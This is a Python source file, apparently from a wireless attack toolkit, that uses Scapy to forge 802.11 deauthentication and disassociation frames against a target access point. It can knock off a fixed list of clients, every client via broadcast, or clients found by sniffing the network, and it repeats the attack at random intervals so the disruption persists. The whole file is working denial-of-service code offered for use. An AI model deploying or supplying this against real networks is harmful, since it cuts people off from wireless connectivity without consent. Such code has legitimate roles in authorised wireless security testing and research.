import random
import time

from itertools import chain

from scapy.all import sendp, RadioTap, Dot11, Dot11ProbeResp,\
                      Dot11Deauth, Dot11Disas

from sniffer import WiFiSniffer
from utils import ChannelFinder, WiFiInterface


class WiFiDeauthAttack(object):
    
    INITIAL_SEQ_NUMBER = 0
    PACKETS_PER_PROBE = 1
    NUM_PROBES = 50    
    
    DEFAULT_DEAUTH_REASON = 3
    
    WIFI_BROADCAST_ADDRESS = 'ff:ff:ff:ff:ff:ff'

    def __init__(self, interface, bssid):
        self.interface = WiFiInterface(interface)
        self.bssid = bssid.lower()
        
    def run(self, executions, persistence_times):
        # First, retrieve the channel used by the target AP in order to
        # configure the wireless interface so it can inject deauth packets.
        channel = ChannelFinder(self.interface, self.bssid).find()
        self.interface.set_channel(channel)

        # Finally, run the attack as many times as requested.
        self._do_run()
        for _ in range(executions-1):
            idle_time = random.randint(*persistence_times)
            time.sleep(idle_time)
            self._do_run()
        
    def _build_packet(self, seq, source, dest, body):
        encoded_seq = seq << 4
        return   RadioTap()\
               / Dot11(SC=encoded_seq, addr1=dest, addr2=source,
                       addr3=self.bssid)\
               / body        
        
    def _build_deauth_packet(self, seq, source, dest):
        body = Dot11Deauth(reason=self.DEFAULT_DEAUTH_REASON)
        return self._build_packet(seq, source, dest, body)

    def _build_disas_packet(self, seq, source, dest):
        body = Dot11Disas(reason=self.DEFAULT_DEAUTH_REASON)
        return self._build_packet(seq, source, dest, body)
    
    def _replicate_and_send(self, packet1, packet2):
        packets = [(packet1, packet2)
                   for _ in range(self.PACKETS_PER_PROBE)]
        packets = list(chain.from_iterable(packets))
        self._send(packets)
          
    def _send(self, packets):
        sendp(packets, iface=self.interface.get_name(), verbose=0)
        
    def _do_run(self):
        raise NotImplementedError


class FixedClientDeauthAttack(WiFiDeauthAttack):
    
    def __init__(self, interface, bssid, clients):
        super(FixedClientDeauthAttack, self).__init__(interface, bssid)
        self.clients = clients
    
    def _deauth_client(self, client, seq):
        client_packet = self._build_deauth_packet(seq,
                                                  source=client,
                                                  dest=self.bssid)
        ap_packet = self._build_deauth_packet(seq,
                                              source=self.bssid,
                                              dest=client)
        
        self._replicate_and_send(client_packet, ap_packet)

    def _do_run(self):
        for seq in xrange(self.INITIAL_SEQ_NUMBER,
                          self.INITIAL_SEQ_NUMBER+self.NUM_PROBES):
            for client in self.clients:
                self._deauth_client(client, seq)


class GlobalDisassociationAttack(WiFiDeauthAttack):
    
    def _do_run(self):
        for seq in xrange(self.INITIAL_SEQ_NUMBER,
                          self.INITIAL_SEQ_NUMBER+self.NUM_PROBES):
            deauth_packet = self._build_deauth_packet(seq, source=self.bssid,
                                                      dest=self.WIFI_BROADCAST_ADDRESS)
            disas_packet = self._build_disas_packet(seq, source=self.bssid,
                                                    dest=self.WIFI_BROADCAST_ADDRESS)            

            self._replicate_and_send(deauth_packet, disas_packet)


class SniffedClientDeauthAttack(WiFiDeauthAttack):

    def __init__(self, interface, bssid, timeout):
        super(SniffedClientDeauthAttack, self).__init__(interface, bssid)
        self.timeout = timeout
        self.clients = set()

    def _is_valid(self, address):
        # Filter client addresses by discarding broadcast addresses as well as
        # AP address occurrences (also discarding null entries since Scapy 
        # fills with None those missing addresses).
        address = address.lower()
        return address is not None and\
               address != self.WIFI_BROADCAST_ADDRESS and\
               address != self.bssid

    def _get_client_addresses(self):
        sniffer = WiFiSniffer(self.interface)
        packets = sniffer.sniff(timeout=self.timeout,
                                lfilter=lambda pkt: not pkt.haslayer(Dot11ProbeResp) and\
                                                    pkt.addr3 == self.bssid)
        clients = set()
        
        for packet in packets:
            if self._is_valid(packet.addr1):
                clients.add(packet.addr1)
            if self._is_valid(packet.addr2):
                clients.add(packet.addr2)

        return clients

    def _do_run(self):
        # First get client addresses by sniffing the network. Avoid computing
        # this if it was already done in previous executions.
        if not self.clients:
            self.clients = self._get_client_addresses()
        
        # Now launch the attack against these clients.
        attack = FixedClientDeauthAttack(self.interface, self.bssid, self.clients)
        attack._do_run()